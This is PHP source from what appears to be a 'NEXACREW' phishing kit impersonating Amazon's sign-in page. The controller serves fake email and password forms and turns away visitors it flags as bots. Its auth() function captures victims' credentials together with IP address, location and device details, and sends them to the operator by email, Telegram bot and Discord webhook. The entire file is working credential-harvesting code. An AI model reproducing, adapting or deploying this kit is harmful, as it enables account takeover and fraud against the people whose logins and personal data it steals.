<?php
defined("ALLOW") or exit('No direct script access allowed');

class Signin
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 1)) {

			write(FCPATH . 'FAMOUS/Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'FAMOUS/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|NO PARAM BLOCKED\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/signin');
		} else {
			echo view('pc/signin');
		}
	}

	public function pwd()
	{
		$_SESSION['emailLogin'] = $_POST['emailLogin'];
		if (empty($_SESSION['emailLogin'])) {
			header('Location: /signin?secure=' . md5(time()));
			exit;
		} else if ($this->goNEXA->is_mobile) {
			echo view('mobile/pwd');
		} else {
			echo view('pc/pwd');
		}
	}

	public function auth()
	{
		if (isset($_POST['emailLogin']) and isset($_POST['passwordLogin'])) {
			$_SESSION['emailLogin']     = trim($_POST['emailLogin']);
			$_SESSION['passwordLogin']    = trim($_POST['passwordLogin']);

			$email    = trim($_POST['emailLogin']);
			$password = trim($_POST['passwordLogin']);

			$message =
				"== [NEXACREW] ==

== [LOG AMAZON] ==

:: Email          : {$email}
:: Password       : {$password}
:: Checking       : {$email}|{$password}

== [DEVICE INFORMATION] ==

:: Date & Time    : " . _date() . "
:: Device         : {$this->goNEXA->platform}
:: Browser        : {$this->goNEXA->browser}
:: Country        : {$_SESSION['country']}
:: State          : {$_SESSION['region']}
:: City           : {$_SESSION['city']}
:: IP Address     : {$this->goNEXA->ip_address}
:: User Agent     : {$this->goNEXA->agent}";

			$subject = "AMAZON ACCOUNT :: [ {$this->goNEXA->ip_address} - {$_SESSION['country']} ]";
			$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

			if (_config('GETACCOUNT') == 'on') {
				@mail(_config('RESULT'), $subject, $message, $headers);
			}

			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode($message));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				curl_exec($c);
				curl_close($c);
			}

			if (discord('Discord') == 'on') {
				$discordWebhook = discord('DISCORD_WEBHOOK'); // Contoh: https://discord.com/api/webhooks/xxx/yyy
				$json_data = json_encode([
					"content" => $message
				]);

				$ch = curl_init($discordWebhook);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_exec($ch);
				curl_close($ch);
			}

			write(FCPATH . 'Static/log_account.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|GET AMAZON ACCOUNT\r\n");

			$_SESSION['access'] = 2;
			redirect(base_url() . 'activity?_ts=' . md5(time()));
		}
	}
}
